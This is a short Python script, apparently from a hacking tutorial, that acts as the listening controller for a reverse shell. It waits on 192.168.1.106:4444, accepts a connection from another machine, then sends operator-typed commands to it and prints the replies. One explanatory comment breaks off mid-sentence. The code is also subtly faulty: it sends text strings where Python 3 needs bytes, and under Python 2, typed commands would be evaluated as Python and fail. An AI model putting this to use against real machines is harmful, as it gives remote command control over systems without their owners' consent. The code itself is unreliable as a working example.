

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
# change an option in the listener. The 2nd argument
# it takes is the option we want to modify, that is
# SO_REUSEADDR. We set the value to 1, which means we
# are enabling this option. What we are doing here is 
# enabling an option that allows us to reuse sockets,
# so in case the connection drops or we lose the connection
# we can reestablish a new connection
listener.bind(("192.168.1.106",4444))
# You can use any port you want as long as its not being
# used by your machine
listener.listen(0) #Backlog
# Backlog = The number of connections that can be queued
# before the system starts refusing connections. By setting
# it to 0, we ...
print("[+] Waiting for incoming connections...")
connection, address = listener.accept() # If you get a connection, I want you to accept it
print("Got a connection from" + str(address))

while True:
  command = input(">> ")
  connection.send(command)
  result = connection.recv(1024)
  print(result)